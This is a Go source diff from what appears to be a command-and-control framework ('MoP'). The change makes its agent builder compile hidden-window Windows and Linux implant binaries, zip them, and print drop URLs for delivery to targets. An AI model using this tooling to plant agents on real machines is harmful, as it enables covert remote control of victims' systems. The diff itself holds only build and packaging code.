@@ -3,6 +3,7 @@ package commands
 import (
 	"MoP/src/controllers"
 	"MoP/src/messages"
+	"MoP/src/middlewares"
 	"bufio"
 	"encoding/binary"
 	"fmt"
@@ -129,10 +130,10 @@ func TakeScrenshot(agent string, command []string) {
 
 func BuildAgents(agentName string, host string) {
 	path, _ := os.Getwd()
-	outPath := filepath.Join(filepath.Dir(path), "drop", "agents", agentName)
+	outPath := filepath.Join(filepath.Dir(path), "drop", "agents")
 	agentPath := filepath.Join(filepath.Dir(path), "agent", "agent.go")
-	commands := [2]string{"GOOS=windows go build -ldflags -H=windowsgui  -o " + outPath + ".exe " + agentPath,
-		"go build -o " + outPath + " " + agentPath}
+	commands := [2]string{"GOOS=windows go build -ldflags -H=windowsgui  -o " + outPath + "/" + agentName + ".exe " + agentPath,
+		"go build -o " + outPath + "/" + agentName + " " + agentPath}
 	for _, command := range commands {
 		_, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
 		if err != nil {
@@ -140,8 +141,28 @@ func BuildAgents(agentName string, host string) {
 			return
 		}
 	}
+
+	// Zip Files
+	// buildAgents := [2]string{agentName, agentName + ".exe"}
+	// zip linux agent
+	err := middlewares.ZipFile(filepath.Join(outPath, agentName), filepath.Join(outPath, agentName + "_lin.zip"))
+	if err != nil {
+		messages.ErrorMessage("zip linux agent", err)
+		return
+	}
+
+	// zip windows agent
+	err = middlewares.ZipFile(filepath.Join(outPath, agentName + ".exe"), filepath.Join(outPath, agentName + "_win.zip"))
+	if err != nil {
+		messages.ErrorMessage("zip windows agent", err)
+		return
+	}
+
+
+
 	fmt.Println()
-	fmt.Printf("[+] Agents URL:\n\t- %s/drop/agents/%s.exe\n\t- %s/drop/agents/%s", host, agentName, host, agentName)
+	fmt.Printf("[+] Agents URL:\n\t- %s/drop/agents/%s.exe\n\t- %s/drop/agents/%s_win.zip\n\t- %s/drop/agents/%s\n\t- %s/drop/agents/%s_lin.zip",
+	host, agentName, host, agentName, host, agentName, host, agentName)
 	fmt.Println()
 }
 
